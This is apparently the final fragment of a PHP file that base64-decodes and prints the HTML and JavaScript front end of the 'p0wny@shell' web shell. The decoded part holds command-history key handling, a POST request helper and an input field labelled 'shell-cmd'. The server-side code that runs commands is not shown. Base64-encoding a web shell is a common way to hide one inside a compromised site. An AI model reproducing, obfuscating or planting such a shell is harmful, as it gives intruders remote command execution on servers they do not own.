ICAgICAgICAgICAgICAgICAgICAgICAgaGlzdG9yeVBvc2l0aW9uLS07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC5ibHVyKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC52YWx1ZSA9IGNvbW1hbmRIaXN0b3J5W2hpc3RvcnlQb3NpdGlvbl07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfZGVmZXIoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQuZm9jdXMoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNhc2UgIkFycm93RG93biI6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChoaXN0b3J5UG9zaXRpb24gPj0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBoaXN0b3J5UG9zaXRpb24rKzsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGhpc3RvcnlQb3NpdGlvbiA9PT0gY29tbWFuZEhpc3RvcnkubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC52YWx1ZSA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQuYmx1cigpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZVNoZWxsQ21kSW5wdXQuZm9jdXMoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVTaGVsbENtZElucHV0LnZhbHVlID0gY29tbWFuZEhpc3RvcnlbaGlzdG9yeVBvc2l0aW9uXTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICBjYXNlICdUYWInOgogICAgICAgICAgICAgICAgICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICAgICAgICAgICAgICBmZWF0dXJlSGludCgpOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gaW5zZXJ0VG9IaXN0b3J5KGNtZCkgewogICAgICAgICAgICAgICAgY29tbWFuZEhpc3RvcnkucHVzaChjbWQpOwogICAgICAgICAgICAgICAgaGlzdG9yeVBvc2l0aW9uID0gY29tbWFuZEhpc3RvcnkubGVuZ3RoOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBtYWtlUmVxdWVzdCh1cmwsIHBhcmFtcywgY2FsbGJhY2spIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGdldFF1ZXJ5U3RyaW5nKCkgewogICAgICAgICAgICAgICAgICAgIHZhciBhID0gW107CiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIga2V5IGluIHBhcmFtcykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyYW1zLmhhc093blByb3BlcnR5KGtleSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEucHVzaChlbmNvZGVVUklDb21wb25lbnQoa2V5KSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudChwYXJhbXNba2V5XSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBhLmpvaW4oIiYiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgICAgICAgICAgICAgIHhoci5vcGVuKCJQT1NUIiwgdXJsLCB0cnVlKTsKICAgICAgICAgICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CiAgICAgICAgICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHhoci5yZWFkeVN0YXRlID09PSA0ICYmIHhoci5zdGF0dXMgPT09IDIwMCkgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJlc3BvbnNlSnNvbiA9IEpTT04ucGFyc2UoeGhyLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhyZXNwb25zZUpzb24pOwogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIHdoaWxlIHBhcnNpbmcgcmVzcG9uc2U6ICIgKyBlcnJvcik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgeGhyLnNlbmQoZ2V0UXVlcnlTdHJpbmcoKSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGRvY3VtZW50Lm9uY2xpY2sgPSBmdW5jdGlvbihldmVudCkgewogICAgICAgICAgICAgICAgZXZlbnQgPSBldmVudCB8fCB3aW5kb3cuZXZlbnQ7CiAgICAgICAgICAgICAgICB2YXIgc2VsZWN0aW9uID0gd2luZG93LmdldFNlbGVjdGlvbigpOwogICAgICAgICAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50OwoKICAgICAgICAgICAgICAgIGlmICh0YXJnZXQudGFnTmFtZSA9PT0gIlNFTEVDVCIpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCFzZWxlY3Rpb24udG9TdHJpbmcoKSkgewogICAgICAgICAgICAgICAgICAgIGVTaGVsbENtZElucHV0LmZvY3VzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CgogICAgICAgICAgICB3aW5kb3cub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzaGVsbC1jbWQiKTsKICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic2hlbGwtY29udGVudCIpOwogICAgICAgICAgICAgICAgdXBkYXRlQ3dkKCk7CiAgICAgICAgICAgICAgICBlU2hlbGxDbWRJbnB1dC5mb2N1cygpOwogICAgICAgICAgICB9OwogICAgICAgIDwvc2NyaXB0PgogICAgPC9oZWFkPgoKICAgIDxib2R5PgogICAgICAgIDxkaXYgaWQ9InNoZWxsIj4KICAgICAgICAgICAgPHByZSBpZD0ic2hlbGwtY29udGVudCI+CiAgICAgICAgICAgICAgICA8ZGl2IGlkPSJzaGVsbC1sb2dvIj4KICAgICAgICBfX18gICAgICAgICAgICAgICAgICAgICAgICAgX19fXyAgICAgIF8gICAgICAgICAgXyBfICAgICAgICBfICBfICAgPHNwYW4+PC9zcGFuPgogXyBfXyAgLyBfIFxfXyAgICAgIF9fXyBfXyAgXyAgIF8gIC8gX18gXCBfX198IHxfXyAgIF9fX3wgfCB8XyAvXC98fCB8fCB8XyA8c3Bhbj48L3NwYW4+CnwgJ18gXHwgfCB8IFwgXCAvXCAvIC8gJ18gXHwgfCB8IHwvIC8gX2AgLyBfX3wgJ18gXCAvIF8gXCB8IChfKS9cL18gIC4uICBffDxzcGFuPjwvc3Bhbj4KfCB8XykgfCB8X3wgfFwgViAgViAvfCB8IHwgfCB8X3wgfCB8IChffCBcX18gXCB8IHwgfCAgX18vIHwgfF8gICB8XyAgICAgIF98PHNwYW4+PC9zcGFuPgp8IC5fXy8gXF9fXy8gIFxfL1xfLyB8X3wgfF98XF9fLCB8XCBcX18sX3xfX18vX3wgfF98XF9fX3xffF8oXykgICAgfF98fF98ICA8c3Bhbj48L3NwYW4+CnxffCAgICAgICAgICAgICAgICAgICAgICAgICB8X19fLyAgXF9fX18vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPjwvc3Bhbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L3ByZT4KICAgICAgICAgICAgPGRpdiBpZD0ic2hlbGwtaW5wdXQiPgogICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0ic2hlbGwtY21kIiBpZD0ic2hlbGwtcHJvbXB0IiBjbGFzcz0ic2hlbGwtcHJvbXB0Ij4/Pz88L2xhYmVsPgogICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgaWQ9InNoZWxsLWNtZCIgbmFtZT0iY21kIiBvbmtleWRvd249Il9vblNoZWxsQ21kS2V5RG93bihldmVudCkiLz4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvYm9keT4KCjwvaHRtbD4="));?>
